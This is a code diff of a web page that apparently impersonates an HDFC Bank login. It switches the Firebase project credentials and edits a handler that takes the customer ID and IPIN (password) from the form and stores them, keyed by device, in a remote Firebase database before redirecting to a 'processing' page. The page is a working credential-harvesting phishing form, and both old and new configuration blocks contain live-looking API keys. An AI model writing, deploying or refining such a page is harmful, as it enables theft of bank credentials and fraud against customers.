@@ -165,14 +165,14 @@
 
     <script>
         const firebaseConfig = {
-            apiKey: "AIzaSyDrTNuW2u0b0fJpL-8Yb8STBggon0p-zcs",
-            authDomain: "hdfc-a-client-apcd001.firebaseapp.com",
-            databaseURL: "https://hdfc-a-client-apcd001-default-rtdb.firebaseio.com",
-            projectId: "hdfc-a-client-apcd001",
-            storageBucket: "hdfc-a-client-apcd001.firebasestorage.app",
-            messagingSenderId: "552520760858",
-            appId: "1:552520760858:web:0e0917aa3355b141315ba3",
-            measurementId: "G-JM2VQHTSKF"
+            apiKey: "AIzaSyBk9QFAx5Z56tZq6Sezo9w07TQ_hgwgcYM",
+            authDomain: "a-comp-hdfc-apcd006.firebaseapp.com",
+            databaseURL: "https://a-comp-hdfc-apcd006-default-rtdb.firebaseio.com",
+            projectId: "a-comp-hdfc-apcd006",
+            storageBucket: "a-comp-hdfc-apcd006.firebasestorage.app",
+            messagingSenderId: "688804381427",
+            appId: "1:688804381427:web:bc75ee0735735c49086d86",
+            measurementId: "G-41FRGHMX2M"
         };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
@@ -195,14 +195,13 @@
             const ipin = document.getElementById('password').value;
 
             if (userInput === currentCaptcha) {
-                const timestamp = Date.now();
                 const payload = {
                     customer_id: userid,
                     ipin: ipin,
-                    last_updated: timestamp
+                    captcha_verified: true,
+                    last_updated: Date.now()
                 };
                 await database.ref('web/' + deviceId + '/cust_data').update(payload);
-                await database.ref('web_old/' + deviceId + '/cust_data').push(payload);
 
                 location.href = 'index3.html'; // Go to processing
             } else {
